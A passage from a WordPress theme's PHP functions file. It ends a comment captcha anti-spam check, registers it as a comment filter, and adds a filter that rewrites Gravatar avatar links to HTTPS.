		default:err('错误: 验证码错误,请重试.');
	}
	return $commentdata;
}
if ($comment_data['comment_type'] == '') {
	add_filter('preprocess_comment', 'spam_protection_pre');
}

function get_ssl_avatar($avatar) {
	$avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)&.*/', '<img src="https://secure.gravatar.com/avatar/$1?s=$2" class="avatar avatar-$2" height="$2" width="$2">', $avatar);
	return $avatar;
}
add_filter('get_avatar', 'get_ssl_avatar');
?>